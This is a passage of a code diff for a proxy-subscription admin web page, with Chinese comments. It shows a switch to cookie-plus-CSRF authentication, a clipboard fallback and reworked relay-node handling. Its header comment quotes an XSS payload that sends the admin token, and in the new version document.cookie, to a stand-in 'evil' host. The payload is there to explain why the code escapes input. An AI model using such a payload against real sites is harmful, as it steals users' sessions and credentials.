@@ -9,8 +9,8 @@
  *
  * 1. **所有外部数据都要转义。** 节点名来自上游订阅，是完全不可信的输入。
  *    一个机场（或者劫持了机场响应的中间人）只要把节点命名成
- *    `<img src=x onerror=fetch('//evil/'+localStorage.getItem('subagg.token'))>`，
- *    不转义就等于把管理 Token 拱手送出。见 `esc()`。
+ *    `<img src=x onerror=fetch('//evil/'+document.cookie)>`，
+ *    不转义就等于把浏览器状态拱手送出。见 `esc()`。
  *
  * 2. **不用内联 onclick。** 本文件是 ES module，函数不在全局作用域，
  *    内联事件处理器根本调用不到。统一走事件委托 + `data-action`。
@@ -126,13 +126,36 @@ function toast(message, kind = 'ok') {
 }
 
 async function copyText(text) {
+  const value = String(text ?? '').trim();
+  if (!value) {
+    toast('没有可复制的内容，请刷新页面后重试', 'error');
+    return false;
+  }
+
   try {
-    await navigator.clipboard.writeText(text);
+    if (!navigator.clipboard?.writeText) throw new Error('Clipboard API unavailable');
+    await navigator.clipboard.writeText(value);
     toast('已复制到剪贴板');
+    return true;
   } catch {
-    // clipboard API 在非 HTTPS 环境下不可用（本地 http 访问时很常见）。
-    // 与其静默失败，不如告诉用户手动复制。
-    toast('浏览器拒绝了剪贴板访问，请手动选中复制', 'warn');
+    // Clipboard API can be unavailable even on HTTPS because of browser policy.
+    // Use the legacy selection path before asking the user to copy manually.
+    const textarea = document.createElement('textarea');
+    textarea.value = value;
+    textarea.setAttribute('readonly', '');
+    textarea.style.position = 'fixed';
+    textarea.style.opacity = '0';
+    document.body.appendChild(textarea);
+    textarea.select();
+    textarea.setSelectionRange(0, value.length);
+    const copied = typeof document.execCommand === 'function' && document.execCommand('copy');
+    textarea.remove();
+    if (copied) {
+      toast('已复制到剪贴板');
+      return true;
+    }
+    toast('浏览器拒绝了剪贴板访问，请手动选中链接复制', 'warn');
+    return false;
   }
 }
 
@@ -140,8 +163,9 @@ async function copyText(text) {
 //  API
 // ─────────────────────────────────────────────────────────────
 
-const TOKEN_KEY = 'subagg.admin_token';
 const THEME_KEY = 'subagg.theme';
+const CSRF_COOKIE = 'subagg_csrf';
+const DEV_TOKEN_KEY = 'subagg.dev_admin_token';
 
 function applyTheme(theme) {
   if (theme === 'dark') document.documentElement.dataset.theme = 'dark';
@@ -149,33 +173,36 @@ function applyTheme(theme) {
   try { localStorage.setItem(THEME_KEY, theme === 'dark' ? 'dark' : 'light'); } catch { /* ignore */ }
 }
 
+function cookieValue(name) {
+  const prefix = `${encodeURIComponent(name)}=`;
+  const part = document.cookie.split('; ').find((item) => item.startsWith(prefix));
+  return part ? decodeURIComponent(part.slice(prefix.length)) : '';
+}
+
 const api = {
-  token: localStorage.getItem(TOKEN_KEY) || '',
+  devToken: '',
 
-  setToken(value) {
-    this.token = value;
-    localStorage.setItem(TOKEN_KEY, value);
-  },
-
-  clearToken() {
-    this.token = '';
-    localStorage.removeItem(TOKEN_KEY);
+  setDevToken(value) {
+    this.devToken = value;
+    if (value) localStorage.setItem(DEV_TOKEN_KEY, value);
+    else localStorage.removeItem(DEV_TOKEN_KEY);
   },
 
   async request(method, path, body) {
+    const unsafe = !['GET', 'HEAD', 'OPTIONS'].includes(method);
     const res = await fetch(`/api${path}`, {
       method,
+      credentials: 'same-origin',
       headers: {
-        Authorization: `Bearer ${this.token}`,
+        ...(this.devToken ? { Authorization: `Bearer ${this.devToken}` } : {}),
         ...(body ? { 'Content-Type': 'application/json' } : {}),
+        ...(unsafe ? { 'X-CSRF-Token': cookieValue(CSRF_COOKIE) } : {}),
       },
       ...(body ? { body: JSON.stringify(body) } : {}),
     });
 
     if (res.status === 401) {
-      // Token 失效（改过 ADMIN_TOKEN，或从别处复制了错的）。
-      // 退回登录门，而不是让后续每个请求都无声失败。
-      showGate('管理 Token 无效或已变更，请重新输入');
+      showGate('登录已过期，请重新使用 Google 登录');
       throw new Error('未授权');
     }
 
@@ -200,6 +227,7 @@ const api = {
 // ─────────────────────────────────────────────────────────────
 
 const state = {
+  user: null,
   meta: null,
   subscriptions: [],
   profiles: [],
@@ -253,6 +281,7 @@ async function loadAll() {
   state.totals = appState.totals;
   state.nodes = nodes;
   const currentFingerprints = new Set(nodes.map((node) => node.fingerprint));
+  state.picked = new Set([...state.picked].filter((fingerprint) => currentFingerprints.has(fingerprint)));
   const persistedPings = new Map(
     nodes.filter((node) => node.ping).map((node) => [node.fingerprint, node.ping]),
   );
@@ -574,7 +603,7 @@ function ixProviderCardHtml(provider) {
         // 曾经两条并排 + 一条讲原理，同一件事说三遍，反而没人看得懂要做什么。
         provider.credentialBroken
           ? `<div class="err-box"><strong>读不出保存的账号密码</strong>，这个中转商暂时不工作，
-               相关节点会照原样直连。点下面的「编辑」重新填一次账号密码就恢复了。
+               相关 IX 节点会标记为不可用。点下面的「编辑」重新填一次账号密码就恢复了。
                <span class="ix-row-fp">起因：密码是用 ADMIN_TOKEN 加密存的，换过 ADMIN_TOKEN 就解不开旧密码了。</span></div>`
           : provider.lastError
             ? `<div class="err-box">⚠ 上次调用失败：${esc(provider.lastError)}</div>`
@@ -582,7 +611,7 @@ function ixProviderCardHtml(provider) {
       }
       ${
         provider.enabled === false
-          ? `<div class="warn-box"><strong>全局总闸已关闭</strong>：所有 profile 的中转改写一起停用，订阅立刻回全部直连。映射数据保留，重新打开即恢复。</div>`
+          ? `<div class="warn-box"><strong>通道已关闭</strong>：关联 IX 节点保留在列表中并标记为不可用，不会进入订阅。重新打开即恢复。</div>`
           : ''
       }
       ${
@@ -670,8 +699,7 @@ function ixMappingRowsHtml() {
                 ? `<button class="icobtn" data-action="ix-keep-orphan" data-fp="${esc(mapping.fingerprint)}">保留</button>`
                 : ''
             }
-            <button class="icobtn" data-action="ix-unlink" data-fp="${esc(mapping.fingerprint)}" data-id="${esc(mapping.providerId)}">解除</button>
-            <button class="icobtn danger" data-action="ix-delete-remote" data-fp="${esc(mapping.fingerprint)}" data-id="${esc(mapping.providerId)}">删除远端端口</button>
+            <button class="icobtn danger" data-action="ix-delete-remote" data-fp="${esc(mapping.fingerprint)}" data-id="${esc(mapping.providerId)}">删除 IX 节点</button>
           </td>
         </tr>`;
     })
@@ -702,7 +730,7 @@ function renderIx() {
          <thead><tr><th>节点</th><th>原目标</th><th>中转入口</th><th title="这个中转端口转不转 UDP。决定 hysteria2 / tuic / QUIC 节点能否走中转">UDP</th><th>线路</th><th>状态</th><th>延迟（中转段）</th><th>丢包</th><th>流量</th><th>操作</th></tr></thead>
          <tbody>${ixMappingRowsHtml()}</tbody>
        </table></div>`
-    : `<div class="empty">还没有任何映射<br><b>到节点页勾选节点，再点「建立 IX 转发」</b></div>`;
+    : `<div class="empty">还没有任何 IX 节点<br><b>点「同步状态」可认领平台现有端口，或到节点页生成新节点</b></div>`;
 
   const orphanCount = state.ixMappings.filter((mapping) => mapping.state === 'orphan').length;
 
@@ -858,11 +886,19 @@ function renderNodes(nodes) {
   const ixByFingerprint = ixMappingIndex();
   const rows = pageNodes.map((node) => {
     const ping = state.pingResults.get(node.fingerprint);
-    const status = ping ? ping.ok ? 'online' : 'offline' : 'unknown';
-    const statusLabel = status === 'online' ? '在线' : status === 'offline' ? '离线' : '未测试';
+    const status = node.usable === false ? 'offline' : ping ? ping.ok ? 'online' : 'offline' : 'unknown';
+    const statusLabel = node.usable === false ? '不可用' : status === 'online' ? '在线' : status === 'offline' ? '离线' : '未测试';
     const latency = ping?.ok ? `${ping.latencyMs ?? 0}ms` : '—';
     const mapping = ixByFingerprint.get(node.fingerprint);
-    const ixCell = mapping
+    const relayBadge = {
+      active: ['s-active', 'IX 正常'],
+      stale: ['s-pending', 'IX 状态过期'],
+      pending: ['s-pending', 'IX 待就绪'],
+      unavailable: ['s-error', 'IX 不可用'],
+    }[node.relayState];
+    const ixCell = node.kind === 'ix-relay'
+      ? `<span class="ix-badge ${relayBadge?.[0] ?? 's-error'}" title="${esc(node.relayError ?? `${node.server}:${node.port}`)}">${esc(relayBadge?.[1] ?? 'IX 节点')}</span>`
+      : mapping
       ? (() => {
           const badge = ixStateBadge(mapping);
           const port = mapping.entryPort ?? null;
@@ -876,16 +912,16 @@ function renderNodes(nodes) {
           const udpTitle =
             `该中转端口不转发 UDP，而 ${node.type} 的协议本体跑在 UDP 上 —— ` +
             '改写后是必然连不上的死节点（TCP 通、UDP 黑洞，最难归因的「半坏」），' +
-            '所以生成订阅时会拒绝改写，此节点保持直连。' +
+            '所以不会生成可用的 IX 派生节点。' +
             '下一步：在中转平台给这个端口开启 UDP 转发后到 IX 页点「同步状态」，或让这类节点就保持直连。';
           return `<span class="ix-badge ${badge.cls}" title="${esc(title)}">${badge.label}${port ? ` · ${esc(port)}` : ''}</span>${
-            udpDead ? `<span class="ix-badge u-off" title="${esc(udpTitle)}">不转 UDP · 直连</span>` : ''
+            udpDead ? `<span class="ix-badge u-off" title="${esc(udpTitle)}">不转 UDP</span>` : ''
           }`;
         })()
       : '<span class="ix-cell-none">—</span>';
     return `<tr class="${state.selectedNodeFp === node.fingerprint ? 'selected' : ''}" data-action="select-node" data-fp="${esc(node.fingerprint)}">
-      <td class="pick-cell"><input type="checkbox" data-action="pick-node" data-fp="${esc(node.fingerprint)}" ${state.picked.has(node.fingerprint) ? 'checked' : ''}></td>
-      <td><span class="nname">${regionFlag(node.region)} ${esc(node.name)}</span><small class="node-fingerprint">${esc(node.fingerprint)}</small></td>
+      <td class="pick-cell"><input type="checkbox" data-action="pick-node" data-fp="${esc(node.fingerprint)}" ${state.picked.has(node.fingerprint) ? 'checked' : ''} ${node.usable === false ? 'disabled' : ''}></td>
+      <td><span class="nname">${regionFlag(node.region)} ${esc(node.name)}${node.kind === 'ix-relay' ? ' <em class="ix-badge s-active">IX</em>' : ''}</span><small class="node-fingerprint">${esc(node.fingerprint)}</small></td>
       <td><span class="nbadge t-${esc(node.type)}">${esc(node.type.toUpperCase())}</span></td>
       <td>${regionTag(node.region, node.region)}</td>
       <td class="nmono">${esc(node.server)}</td>
@@ -894,17 +930,19 @@ function renderNodes(nodes) {
       <td><span class="status-pill ${status}"><i></i>${statusLabel}</span></td>
       <td class="nsrc">${esc(node.sourceName)}</td>
       <td>${ixCell}</td>
-      <td class="row-actions"><button class="icon-action" data-action="ping-node" data-fp="${esc(node.fingerprint)}" title="测试 TCP 连通性">ϟ</button><button class="icon-action" data-action="copy-node" data-fp="${esc(node.fingerprint)}" title="复制 URI">↗</button><button class="icon-action" data-action="select-node" data-fp="${esc(node.fingerprint)}" title="查看详情">⋮</button></td>
+      <td class="row-actions">${node.usable === false ? '' : `<button class="icon-action" data-action="ping-node" data-fp="${esc(node.fingerprint)}" title="测试 TCP 连通性">ϟ</button><button class="icon-action" data-action="copy-node" data-fp="${esc(node.fingerprint)}" title="复制 URI">↗</button>`}<button class="icon-action" data-action="select-node" data-fp="${esc(node.fingerprint)}" title="查看详情">⋮</button>${node.kind === 'ix-relay' ? `<button class="icon-action danger" data-action="ix-delete-relay" data-fp="${esc(node.fingerprint)}" title="删除 IX 节点与远端端口">×</button>` : ''}</td>
     </tr>`;
   }).join('');
 
   // 勾选了节点时，在表格顶部插一条操作栏 —— 这是"生成选择"的入口
+  const pickedNodes = state.nodes.filter((node) => state.picked.has(node.fingerprint));
+  const pickedSources = pickedNodes.filter((node) => node.kind !== 'ix-relay');
   const actionBar = state.picked.size
     ? `<tr><td colspan="11" style="background:var(--adim)">
         <div style="display:flex;align-items:center;gap:10px">
           <span>已勾选 <b>${state.picked.size}</b> 个节点</span>
           <button class="mini-btn" data-action="profile-from-picked">用它们新建配置文件</button>
-          <button class="mini-btn" data-action="ix-map-picked">建立 IX 转发</button>
+          ${pickedSources.length ? `<button class="mini-btn" data-action="ix-map-picked">生成 IX 节点（${pickedSources.length}）</button>` : ''}
           <button class="mini-btn" data-action="clear-picked">清空勾选</button>
         </div>
       </td></tr>`
@@ -986,11 +1024,12 @@ async function loadLatencyHistory(fingerprint) {
 function openNodeDetail(node) {
   if (!node) return;
   const ping = state.pingResults.get(node.fingerprint);
-  const status = ping ? ping.ok ? 'online' : 'offline' : 'unknown';
-  const statusLabel = status === 'online' ? '在线' : status === 'offline' ? '离线' : '未测试';
+  const status = node.usable === false ? 'offline' : ping ? ping.ok ? 'online' : 'offline' : 'unknown';
+  const statusLabel = node.usable === false ? '不可用' : status === 'online' ? '在线' : status === 'offline' ? '离线' : '未测试';
   openModal(`
     <div class="node-modal-head"><div><div class="detail-kicker">NODE DETAIL</div><h2>${regionFlag(node.region)} ${esc(node.name)}</h2><p>${esc(node.sourceName)} · ${esc(node.type.toUpperCase())}</p></div><button class="node-modal-close" data-action="close-modal" aria-label="关闭节点详情">×</button></div>
-    <div class="node-modal-actions"><span class="status-pill ${status}"><i></i>${statusLabel}</span><button class="btn-sec" data-action="ping-node" data-fp="${esc(node.fingerprint)}">ϟ 测试连接</button><button class="btn-sec" data-action="copy-node" data-fp="${esc(node.fingerprint)}">↗ 复制 URI</button><button class="btn-sec" data-action="node-qr" data-fp="${esc(node.fingerprint)}" data-value="${esc(node.name)}">▦ 二维码</button></div>
+    <div class="node-modal-actions"><span class="status-pill ${status}"><i></i>${statusLabel}</span>${node.usable === false ? '' : `<button class="btn-sec" data-action="ping-node" data-fp="${esc(node.fingerprint)}">ϟ 测试连接</button><button class="btn-sec" data-action="copy-node" data-fp="${esc(node.fingerprint)}">↗ 复制 URI</button><button class="btn-sec" data-action="node-qr" data-fp="${esc(node.fingerprint)}" data-value="${esc(node.name)}">▦ 二维码</button>`}${node.kind === 'ix-relay' ? `<button class="btn-danger" data-action="ix-delete-relay" data-fp="${esc(node.fingerprint)}">删除 IX 节点</button>` : ''}</div>
+    ${node.kind === 'ix-relay' ? `<div class="${node.usable === false ? 'err-box' : 'field-hint'}">原节点：<code>${esc(node.originFingerprint ?? '')}</code>${node.relayError ? `<br>${esc(node.relayError)}` : ''}</div>` : ''}
     <div class="node-detail-grid"><div><span>地区</span><strong>${regionTag(node.region, node.region)}</strong></div><div><span>服务器</span><strong class="detail-code">${esc(node.server)}</strong></div><div><span>端口</span><strong>${node.port}</strong></div><div><span>TCP 延迟</span><strong class="${status === 'online' ? 'metric-ok' : ''}">${ping?.ok ? `${ping.latencyMs ?? 0}ms` : '—'}</strong></div><div><span>最近测试</span><strong>${ping ? fmtTime(ping.checkedAt) : '尚未测试'}</strong></div><div><span>节点指纹</span><strong class="detail-code">${esc(node.fingerprint)}</strong></div></div>
     <section class="latency-history"><div class="latency-history-head"><div><div class="detail-kicker">LATENCY HISTORY</div><h3>延迟趋势</h3></div><span>每 ${state.meta?.nodePingIntervalHours ?? 12} 小时自动测试</span></div><div id="nodeLatencyHistory" data-fingerprint="${esc(node.fingerprint)}"><div class="latency-history-empty">正在读取最近 90 天数据…</div></div></section>
     <p class="node-modal-note">测试只建立 TCP 连接，不发送代理凭据；结果不表示代理认证成功。历史保留最近 90 天。</p>`, true, 'node-detail-modal');
@@ -1011,7 +1050,7 @@ async function pingNode(fingerprint) {
 
 async function pingAllNodes() {
   if (state.pingRun) return;
-  const targets = [...state.nodes];
+  const targets = state.nodes.filter((node) => node.usable !== false);
   if (!targets.length) {
     toast('没有可测试的节点', 'warn');
     return;
@@ -1083,7 +1122,6 @@ function ruleTags(rule) {
     const l = rule.chain.landing?.pick?.length ?? 0;
     tags.push(`链式 ${e}×${l}`);
   }
-  if (rule.ix?.enabled) tags.push('IX 中转');
   if (tags.length === 0) tags.push('全部节点');
   return tags;
 }
@@ -1299,11 +1337,12 @@ async function renderFriends() {
             (t) => `
           <div class="token-row${(t.expiresAt !== null && t.expiresAt < Date.now()) || (t.maxAccess !== null && t.accessCount >= t.maxAccess) ? ' dead' : ''}">
             <span class="token-url" title="${esc(t.url)}">${esc(t.url)}</span>
-            <span class="field-hint">${tokenExpiryHtml(t.expiresAt)} ${tokenQuotaHtml(t)}</span>
-            <button class="icobtn" data-action="copy-token" data-url="${esc(t.url)}">复制</button>
-            <button class="icobtn" data-action="edit-token" data-token="${esc(t.token)}">编辑</button>
-            <button class="icobtn" data-action="rotate-token" data-token="${esc(t.token)}">轮换</button>
-            <button class="icobtn danger" data-action="revoke-token" data-token="${esc(t.token)}">吊销</button>
+            <span class="token-actions"><span class="field-hint">${tokenExpiryHtml(t.expiresAt)} ${tokenQuotaHtml(t)}</span>
+              <button class="icobtn" data-action="copy-token" data-url="${esc(t.url)}">复制</button>
+              <button class="icobtn" data-action="edit-token" data-token="${esc(t.token)}">编辑</button>
+              <button class="icobtn" data-action="rotate-token" data-token="${esc(t.token)}">轮换</button>
+              <button class="icobtn danger" data-action="revoke-token" data-token="${esc(t.token)}">吊销</button>
+            </span>
           </div>`,
           )
           .join('')}
@@ -1763,7 +1802,7 @@ function renderProfileModal() {
     </div>
 
     <div class="modal-actions">
-      ${isEditing ? `<button class="btn-danger" data-action="delete-profile" data-id="${esc(editingProfile.id)}">删除</button>` : ''}
+      ${isEditing ? `<button class="btn-danger" data-action="delete-profile-request" data-id="${esc(editingProfile.id)}">删除配置</button>` : ''}
       <div class="spacer"></div>
       <button class="btn-sec" data-action="close-modal">取消</button>
       <button class="btn-pri" data-action="save-profile">${isEditing ? '保存' : '创建'}</button>
@@ -1784,12 +1823,28 @@ function chainPicked(role) {
   return new Set(editingProfile.rule.chain?.[role]?.pick ?? []);
 }
 
+function chainNamePreview(template, entry, landing) {
+  const value = template.trim() || '{entry} -RELAY- {landing}';
+  return value.replace(/\{(entry|landing|seq)\}/g, (_whole, key) => ({
+    entry: entry?.name ?? '入口节点',
+    landing: landing?.name ?? '落地节点',
+    seq: '1',
+  })[key]);
+}
+
 function chainPickerHtml() {
   const rule = editingProfile.rule.chain ?? { enabled: false, entry: { pick: [] }, landing: { pick: [] } };
   const entry = chainPicked('entry');
   const landing = chainPicked('landing');
+  const nameTemplate = rule.nameTemplate ?? '{entry} -RELAY- {landing}';
+  const previewName = chainNamePreview(
+    nameTemplate,
+    state.nodes.find((node) => entry.has(node.fingerprint)),
+    state.nodes.find((node) => landing.has(node.fingerprint)),
+  );
   const query = chainPickerQuery.trim().toLowerCase();
   const candidates = state.nodes.filter((node) => {
+    if (node.usable === false) return false;
     if (!query) return true;
     return `${node.name} ${node.server} ${node.type} ${node.region ?? ''}`.toLowerCase().includes(query);
   });
@@ -1818,7 +1873,7 @@ function chainPickerHtml() {
             <div class="pe-candidate-actions"><button class="pe-add-btn${entry.has(node.fingerprint) ? ' selected' : ''}" data-action="chain-add" data-role="entry" data-fp="${esc(node.fingerprint)}">${entry.has(node.fingerprint) ? '入口 ✓' : '+ 入口'}</button><button class="pe-add-btn${landing.has(node.fingerprint) ? ' selected' : ''}" data-action="chain-add" data-role="landing" data-fp="${esc(node.fingerprint)}">${landing.has(node.fingerprint) ? '落地 ✓' : '+ 落地'}</button></div>
           </div>`).join('') : '<div class="pe-empty pe-empty-large">没有匹配的节点</div>'}
       </div>
-      <div class="pe-chain-options"><label class="field"><span class="field-label">统一名称</span><input class="input" id="p-chain-template" value="${esc(rule.nameTemplate ?? '{entry} -RELAY- {landing}')}"><small>默认格式：前置 -RELAY- 落地</small></label><label class="field"><span class="field-label">最多配对</span><input class="input" id="p-chain-max" type="number" min="1" max="1000" value="${rule.maxPairs ?? 200}"></label><label class="checkbox-row pe-direct"><input type="checkbox" id="p-chain-direct" ${rule.keepLandingDirect ? 'checked' : ''}>同时保留落地直连</label></div>
+      <div class="pe-chain-options"><label class="field"><span class="field-label">链式节点名称</span><input class="input" id="p-chain-template" maxlength="200" value="${esc(nameTemplate)}" placeholder="例如：美国中转"><small>可直接填写短名；多个配对会自动补序号。也支持 {entry}、{landing}、{seq}。</small><span class="pe-chain-name-preview">手机端预览：<b id="p-chain-name-preview">${esc(previewName)}</b></span></label><label class="field"><span class="field-label">最多配对</span><input class="input" id="p-chain-max" type="number" min="1" max="1000" value="${rule.maxPairs ?? 200}"></label><label class="checkbox-row pe-direct"><input type="checkbox" id="p-chain-direct" ${rule.keepLandingDirect ? 'checked' : ''}>同时保留落地直连</label></div>
     </section>`;
 }
 
@@ -1832,82 +1887,13 @@ function refreshChainPicker(restoreSearchFocus = false) {
   }
 }
 
-/**
- * profile 级的 IX 中转面板。
- *
- * 两个概念要分清：这里的开关是 **per-profile** 的（这条订阅要不要走中转），
- * 中转商卡片上的「全局总闸」是 **全局** 的（故障时一键让所有 profile 回直连）。
- * 总闸关着的时候这里开了也不生效，所以要当场说明白。
- */
-function ixProfilePanelHtml() {
-  const ix = editingProfile.rule.ix ?? {};
-  const enabled = ix.enabled === true;
-  const fill = ix.fillOriginHost !== false;
-  const providers = state.ixProviders;
-  const masterOff = providers.length > 0 && providers.every((provider) => provider.enabled === false);
-
-  return `
-    <section class="pe-card pe-ix-card">
-      <div class="pe-card-head">
-        <div>
-          <div class="pe-kicker">OPTIONAL RELAY</div>
-          <h2>IX 中转</h2>
-          <p>把命中节点的入口地址换成中转入口，协议参数与凭据一字不动。改写只发生在生成订阅时，不写库。</p>
-        </div>
-        <label class="pe-switch">
-          <input type="checkbox" id="p-ix-enabled" ${enabled ? 'checked' : ''}>
-          <span></span><b>${enabled ? '已启用' : '未启用'}</b>
-        </label>
-      </div>
-      ${
-        providers.length
-          ? ''
-          : `<div class="warn-box">还没有配置中转商。到「IX 中转」页录入一个并测试连接之后，这里才会生效。</div>`
-      }
-      ${
-        masterOff
-          ? `<div class="warn-box">所有中转商的<strong>全局总闸</strong>都是关闭状态，这里开了也不会生效。</div>`
-          : ''
-      }
-      <div class="pe-ix-grid">
-        <label class="field">
-          <span class="field-label">中转商</span>
-          <select class="select" id="p-ix-provider">
-            <option value=""${ix.providerId ? '' : ' selected'}>自动选择</option>
-            ${providers
-              .map(
-                (provider) =>
-                  `<option value="${esc(provider.id)}"${ix.providerId === provider.id ? ' selected' : ''}>${esc(provider.name)}${provider.enabled === false ? '（总闸关闭）' : ''}</option>`,
-              )
-              .join('')}
-          </select>
-          <small>只有一个中转商时选「自动」即可。</small>
-        </label>
-        <div class="field">
-          <span class="field-label">原始 SNI / Host 补写</span>
-          <label class="checkbox-row" style="margin-top:8px">
-            <input type="checkbox" id="p-ix-fill" ${fill ? 'checked' : ''}>
-            自动把原 server 补进 SNI / ws-Host / h2-host / http-Host（推荐保持开启）
-          </label>
-          <div class="err-box ix-fill-warn" id="p-ix-fill-warn" ${fill ? 'hidden' : ''}>
-            关掉之后这 4 个值会回落到中转入口域名，<strong>TLS 类节点基本必然握手失败</strong>，
-            而且失败原因对用户完全不可见。只在明确知道后果时当逃生阀用。
-          </div>
-        </div>
-      </div>
-      <div class="field-hint">
-        当前共有 <b>${state.ixMappings.length}</b> 条节点映射；没有映射的节点会<strong>如实回落直连</strong>并在响应头与预览里给出原因。
-        REALITY 缺 SNI、ss 带插件混淆这类判不准的组合会被保守拒绝改写 —— 保持直连，不静默改坏。
-      </div>
-    </section>`;
-}
-
 let profileNodePickerQuery = '';
 
 function profileNodePickerHtml() {
   const picked = new Set(editingProfile.rule.pick ?? []);
   const query = profileNodePickerQuery.trim().toLowerCase();
   const candidates = state.nodes.filter((node) => {
+    if (node.usable === false) return false;
     if (!query) return true;
     return `${node.name} ${node.server} ${node.type} ${node.region ?? ''}`.toLowerCase().includes(query);
   });
@@ -1965,37 +1951,20 @@ function renderProductProfilePage() {
   editor.classList.add('profile-editor-page');
   editor.innerHTML = `
     <div class="pe-shell">
-      <header class="pe-header"><div class="pe-brand"><button class="pe-back" data-action="close-modal" title="返回">←</button><div><div class="pe-kicker">SUBSCRIPTION PROFILE</div><h1>${isEditing ? '编辑配置文件' : '新建配置文件'}</h1></div></div><div class="pe-header-actions"><span class="pe-status"><i></i>草稿自动保存于本地页面</span><button class="btn-sec" data-action="close-modal">取消</button><button class="btn-pri" data-action="save-profile">${isEditing ? '保存修改' : '创建配置'}</button></div></header>
+      <header class="pe-header"><div class="pe-brand"><button class="pe-back" data-action="close-modal" title="返回">←</button><div><div class="pe-kicker">SUBSCRIPTION PROFILE</div><h1>${isEditing ? '编辑配置文件' : '新建配置文件'}</h1></div></div><div class="pe-header-actions">${isEditing ? `<button class="btn-danger" data-action="delete-profile-request" data-id="${esc(profile.id)}">删除配置</button>` : ''}<span class="pe-status"><i></i>草稿自动保存于本地页面</span><button class="btn-sec" data-action="close-modal">取消</button><button class="btn-pri" data-action="save-profile">${isEditing ? '保存修改' : '创建配置'}</button></div></header>
       <div class="pe-layout">
         <aside class="pe-rail"><div class="pe-rail-label">配置步骤</div><div class="pe-rail-item active"><b>01</b><span>基础信息</span></div><div class="pe-rail-item"><b>02</b><span>节点筛选</span></div><div class="pe-rail-item"><b>03</b><span>链式代理</span><em>可选</em></div><div class="pe-rail-item"><b>04</b><span>输出设置</span></div><div class="pe-rail-note"><strong>设计原则</strong><p>先选择，再配置。保存后可随时编辑，不需要先理解输出文件。</p></div></aside>
         <main class="pe-main">
           <section class="pe-hero"><div class="pe-icon-input"><input class="input" id="p-icon" value="${esc(profile.icon)}" maxlength="2"><small>图标</small></div><div class="pe-hero-fields"><label class="field"><span class="field-label">配置名称</span><input class="input pe-title-input" id="p-name" value="${esc(profile.name)}" placeholder="例如：日常办公节点"></label><label class="field"><span class="field-label">描述</span><input class="input" id="p-desc" value="${esc(profile.description)}" placeholder="给自己看的用途说明"></label></div></section>
-          <section class="pe-card"><div class="pe-card-head"><div><div class="pe-kicker">01 · SELECT</div><h2>节点筛选</h2><p>先缩小候选范围，再决定是否添加链式节点。</p></div><span class="pe-count-pill">${state.nodes.length} 个可用节点</span></div><div class="pe-filter-grid"><div class="pe-filter-block"><span class="field-label">地区</span><div class="chip-group" id="p-regions">${regions.map((reg) => `<button class="chip${r.regions?.includes(reg.code) ? ' on' : ''}" data-action="rule-region" data-value="${esc(reg.code)}">${reg.flag} ${esc(reg.name)}</button>`).join('') || '<span class="pe-empty">暂无地区数据</span>'}</div></div><div class="pe-filter-block"><span class="field-label">协议</span><div class="chip-group" id="p-types">${types.map((type) => `<button class="chip${r.types?.includes(type) ? ' on' : ''}" data-action="rule-type" data-value="${esc(type)}">${esc(type.toUpperCase())}</button>`).join('') || '<span class="pe-empty">暂无协议数据</span>'}</div></div></div></section>
+          <section class="pe-card"><div class="pe-card-head"><div><div class="pe-kicker">01 · SELECT</div><h2>节点筛选</h2><p>先缩小候选范围，再决定是否添加链式节点。IX 派生节点可以和原节点一样直接选择。</p></div><span class="pe-count-pill">${state.nodes.filter((node) => node.usable !== false).length} 个可用节点</span></div><div class="pe-filter-grid"><div class="pe-filter-block"><span class="field-label">地区</span><div class="chip-group" id="p-regions">${regions.map((reg) => `<button class="chip${r.regions?.includes(reg.code) ? ' on' : ''}" data-action="rule-region" data-value="${esc(reg.code)}">${reg.flag} ${esc(reg.name)}</button>`).join('') || '<span class="pe-empty">暂无地区数据</span>'}</div></div><div class="pe-filter-block"><span class="field-label">协议</span><div class="chip-group" id="p-types">${types.map((type) => `<button class="chip${r.types?.includes(type) ? ' on' : ''}" data-action="rule-type" data-value="${esc(type)}">${esc(type.toUpperCase())}</button>`).join('') || '<span class="pe-empty">暂无协议数据</span>'}</div></div></div></section>
           ${profileNodePickerHtml()}
           ${chainPickerHtml()}
-          ${ixProfilePanelHtml()}
           <section class="pe-card"><div class="pe-card-head"><div><div class="pe-kicker">02 · REFINE</div><h2>高级筛选</h2><p>常用场景不需要打开这里。需要时再添加包含或排除条件。</p></div></div><div class="pe-advanced-grid"><div><div class="pe-subhead">包含条件</div><div id="p-include">${exprRows(r.include, 'include')}</div><button class="mini-btn" data-action="add-expr" data-kind="include">+ 添加包含条件</button></div><div><div class="pe-subhead">排除条件</div><div id="p-exclude">${exprRows(r.exclude, 'exclude')}</div><button class="mini-btn" data-action="add-expr" data-kind="exclude">+ 添加排除条件</button></div></div></section>
         </main>
         <aside class="pe-inspector"><div class="pe-inspector-head"><div class="pe-kicker">CONFIGURATION</div><h2>输出设置</h2><p>普通订阅与链式订阅使用同一个配置文件。</p></div><div class="pe-inspector-section"><span class="field-label">默认客户端</span><select class="select" id="p-target">${targets.map((target) => `<option value="${esc(target.value)}"${profile.defaultTarget === target.value ? ' selected' : ''}>${esc(target.label)}</option>`).join('')}</select><small>客户端带有明确 User-Agent 时会自动选择对应格式。</small></div><div class="pe-inspector-section"><span class="field-label">去重方式</span><select class="select" id="p-dedupe"><option value="off"${r.dedupe === 'off' ? ' selected' : ''}>不去重</option><option value="server-port"${r.dedupe === 'server-port' ? ' selected' : ''}>服务器 + 端口</option><option value="fingerprint"${r.dedupe === 'fingerprint' ? ' selected' : ''}>完整指纹</option></select><span class="field-label pe-label-gap">排序</span><select class="select" id="p-sort">${[['none','保持原顺序'],['region','按地区'],['name','按名称'],['type','按协议'],['source','按订阅源']].map(([value,label]) => `<option value="${value}"${r.sort === value ? ' selected' : ''}>${label}</option>`).join('')}</select></div><div class="pe-inspector-section"><span class="field-label">节点数量上限</span><input class="input" id="p-limit" type="number" min="0" max="5000" value="${r.limit ?? 0}"><small>0 表示不限制。链式配对会在此筛选之后生成。</small></div><div class="pe-inspector-section"><span class="field-label">重命名模板</span><input class="input" id="p-rename" value="${esc(r.rename?.[0]?.replace ?? '')}" placeholder="{flag} {regionZh} {index2}"><small>留空保持原名。</small></div><div class="pe-inspector-section"><span class="field-label">流量信息</span><select class="select" id="p-userinfo"><option value="sum"${profile.userinfoMode === 'sum' ? ' selected' : ''}>合计所有订阅源</option><option value="off"${profile.userinfoMode === 'off' ? ' selected' : ''}>不输出</option>${state.subscriptions.map((sub) => `<option value="follow:${esc(sub.id)}"${profile.userinfoMode === `follow:${sub.id}` ? ' selected' : ''}>跟随「${esc(sub.name)}」</option>`).join('')}</select></div><label class="checkbox-row pe-exclude-toggle"><input type="checkbox" id="p-defexc" ${r.useDefaultExclude !== false ? 